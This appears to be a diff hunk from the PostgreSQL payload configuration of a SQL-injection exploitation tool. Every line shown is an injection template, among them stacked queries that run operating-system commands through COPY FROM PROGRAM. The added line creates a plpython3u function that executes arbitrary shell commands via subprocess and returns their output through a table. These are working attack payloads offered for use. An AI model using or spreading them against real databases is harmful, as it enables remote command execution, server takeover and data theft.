@@ -32,6 +32,7 @@ ErrorChunkLen:80
 BlindStrategy: codepoint
 DnsChannel: yes
 CmdExec: 1=1;drop table if exists ssqlinjection;create table ssqlinjection(data text);copy ssqlinjection from program '{cmd}';--
+CmdExec@PlPython: 1=1;create extension if not exists plpython3u;create or replace function sqli_pyeval(cmd text) returns text as $$ import subprocess;return subprocess.check_output(cmd,shell=True).decode('utf-8','replace') $$ language plpython3u;drop table if exists ssqlinjection;create table ssqlinjection(data text);insert into ssqlinjection(data) select unnest(string_to_array(sqli_pyeval('{cmd}'),chr(10)));--
 CmdData:(select data from ssqlinjection offset {index} limit 1)
 CmdDataCount:(select count(1) from ssqlinjection)
 CmdCreateTable: 1=1;drop table if exists ssqlinjection;create table ssqlinjection (data text);--
